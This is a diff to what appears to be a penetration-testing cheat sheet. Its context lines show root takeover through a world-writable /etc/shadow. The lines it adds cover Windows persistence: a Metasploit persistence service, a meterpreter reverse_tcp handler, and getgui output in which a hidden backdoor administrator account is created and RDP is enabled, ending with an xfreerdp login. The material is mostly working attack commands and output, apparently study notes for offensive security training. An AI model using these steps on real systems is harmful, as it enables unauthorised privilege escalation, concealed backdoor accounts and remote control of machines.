@@ -539,7 +539,7 @@ find / -not -type l -perm -o+w
 ls -al /etc/shadow
 -rw-rw-rw- 1 root shadow 551 Jan  3 15:31 /etc/shadow
 ```
-- `-o+w` means others have write permissions
+- `-o+w` means others have write permissions.
 
 ```
 openssl passwd -1 -salt abc password
@@ -551,7 +551,7 @@ root:*:17764:0:99999:7::: --> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7
 su
 Password: password
 ```
-- Modify `/etc/shadow` by setting root password
+- Modify `/etc/shadow` by setting root password.
 
 #### Sudo Privileges
 ```
@@ -575,5 +575,51 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 #### Useful Links
 - https://gtfobins.github.io/
+
+### Windows Persistence
+#### Persistence Via Services
+```
+use exploit/windows/local/persistence_service
+set SESSION <session_id>
+set LPORT <port>
+```
+- Admin or system privilege is required.
+- Change `LPORT` to prevent conflict with existing session(s).
+- Retries every 5 seconds.
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip>
+set LPORT <port>
+```
+
+#### Persistence Via RDP
+```
+meterpreter > run getgui -e -u hackersploit -p hacker_123321
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Enabling Remote Desktop
+[*] 	RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] 	Terminal Services service is already set to auto
+[*] 	Opening port in local firewall if necessary
+[*] Setting user account for logon
+[*] 	Adding User: hackersploit with Password: hacker_123321
+[*] 	Hiding user from Windows Login screen
+[*] 	Adding User: hackersploit to local group 'Remote Desktop Users'
+[*] 	Adding User: hackersploit to local group 'Administrators'
+[*] You can now login with the created user
+[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20240104.1828.rc
+```
+- Creates a backdoor user account.
+- Password must meet complexity requirements.
+
+```
+xfreerdp /u:hackersploit /p:hacker_123321 /v:<ip>
+```
 
 ## Social Engineering
